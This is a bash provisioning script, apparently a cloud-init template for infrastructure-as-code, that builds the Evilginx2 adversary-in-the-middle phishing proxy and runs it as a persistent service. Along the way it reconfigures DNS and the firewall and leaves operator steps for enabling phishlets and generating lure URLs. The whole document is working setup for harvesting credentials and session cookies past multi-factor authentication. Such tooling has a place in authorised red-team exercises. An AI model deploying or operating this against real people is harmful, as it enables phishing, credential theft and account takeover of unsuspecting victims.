#!/usr/bin/env bash
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

apt-get update -y
apt-get upgrade -y
apt-get install -y curl unzip git ufw make wget

# --- SSH hardening ---
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart ssh

# --- Free up port 53 so Evilginx can bind its own DNS server ---
# Ubuntu's systemd-resolved listens on 53 by default; disable the stub.
mkdir -p /etc/systemd/resolved.conf.d
cat > /etc/systemd/resolved.conf.d/disable-stub.conf <<'RESOLV'
[Resolve]
DNSStubListener=no
RESOLV
ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf || true
systemctl restart systemd-resolved || true

# --- Host firewall (SG is primary control; this is defense-in-depth) ---
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw allow 53/udp
ufw allow 53/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw --force enable

# --- Install Go (required to build Evilginx from source) ---
GO_VERSION="1.21.6"
wget -q "https://go.dev/dl/go$${GO_VERSION}.linux-amd64.tar.gz" -O /tmp/go.tgz
rm -rf /usr/local/go
tar -C /usr/local -xzf /tmp/go.tgz
export PATH="$PATH:/usr/local/go/bin"
echo 'export PATH=$PATH:/usr/local/go/bin' >> /etc/profile

# --- Build Evilginx ---
EG_DIR=/opt/evilginx2
git clone https://github.com/kgretzky/evilginx2.git "$EG_DIR"
cd "$EG_DIR"
make

# Install binary + phishlets/redirectors to a stable location
mkdir -p /opt/evilginx/{phishlets,redirectors}
cp "$EG_DIR/build/evilginx" /opt/evilginx/evilginx
cp -r "$EG_DIR/phishlets/." /opt/evilginx/phishlets/ 2>/dev/null || true
cp -r "$EG_DIR/redirectors/." /opt/evilginx/redirectors/ 2>/dev/null || true
chmod +x /opt/evilginx/evilginx

# --- systemd service: run Evilginx headless, controlled via its own ---
# --- terminal/admin (reach the box through the bastion to operate it).---
# Note: Evilginx is interactive; we run it in a detached tmux session so
# operators can attach over SSH (via bastion) to configure phishlets/lures.
apt-get install -y tmux

cat > /etc/systemd/system/evilginx.service <<UNIT
[Unit]
Description=Evilginx2 AiTM proxy
After=network.target

[Service]
Type=forking
WorkingDirectory=/opt/evilginx
ExecStart=/usr/bin/tmux new-session -d -s evilginx '/opt/evilginx/evilginx -p /opt/evilginx/phishlets'
ExecStop=/usr/bin/tmux kill-session -t evilginx
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable evilginx.service
systemctl start evilginx.service

cat > /var/log/provision-status.log <<LOG
Evilginx provisioned: $(date -u)
Domain to configure: ${evilginx_domain}

Operate Evilginx by attaching to its tmux session (via the bastion):
  ssh -J ubuntu@<bastion_ip> ubuntu@<evilginx_private_ip>
  sudo tmux attach -t evilginx

Then inside the Evilginx console run, for example:
  config domain ${evilginx_domain}
  config ipv4 external <evilginx_PUBLIC_ip>
  phishlets hostname <phishlet> ${evilginx_domain}
  phishlets enable <phishlet>
  lures create <phishlet>
  lures get-url <id>

Detach from tmux with: Ctrl-b then d
LOG
